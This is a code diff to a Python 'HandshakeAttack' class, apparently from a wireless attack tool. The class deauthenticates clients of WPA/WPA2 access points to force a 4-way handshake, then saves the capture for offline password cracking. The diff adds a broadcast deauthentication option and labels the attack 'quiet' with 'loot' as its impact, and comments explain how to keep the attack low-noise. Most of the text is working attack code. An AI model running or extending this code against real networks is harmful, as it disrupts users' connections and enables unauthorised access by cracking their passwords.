@@ -19,6 +19,12 @@ class HandshakeAttack(Attack):
     description = ("Listen on the target channel while deauthenticating its clients, "
                    "forcing a fresh 4-way handshake that can be cracked offline.")
     requires = ("airodump", "deauth")
+    #: the broadcast variant deauthenticates every client at once instead of one
+    broadcast = False
+    category = "capture"
+    #: one station, twice: the quietest way to force a 4-way handshake
+    noise = "quiet"
+    impact = "loot"
 
     def applies(self, ap: AccessPoint) -> bool:
         return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3")
@@ -56,7 +62,7 @@ class HandshakeAttack(Attack):
                          bssid=ap.bssid, percent=min(95, tries * 18),
                          detail=(f"attempt {tries}, deauthing {client}" if client else
                                  f"attempt {tries}, {len(ap.clients)} client(s) in range"))
-            ctx.deauth(ap, client=client)
+            ctx.deauth(ap, client=client, broadcast=self.broadcast)
             if ctx.radio.handshake_ok(ap.bssid, tries):
                 # a genuinely valid capture, so validation and cracking are real
                 path = ctx.artifact_path("handshakes", ap, ".cap")
@@ -137,7 +143,8 @@ class HandshakeAttack(Attack):
                     last_burst = time.time()
                     # a named station is deauthenticated on its own: one client's
                     # reconnect is a smaller, quieter ask than a broadcast burst
-                    deauth_done += ctx.deauth(ap, client=client)
+                    deauth_done += ctx.deauth(ap, client=client,
+                                              broadcast=self.broadcast)
                 time.sleep(1.0)
         finally:
             with contextlib.suppress(Exception):
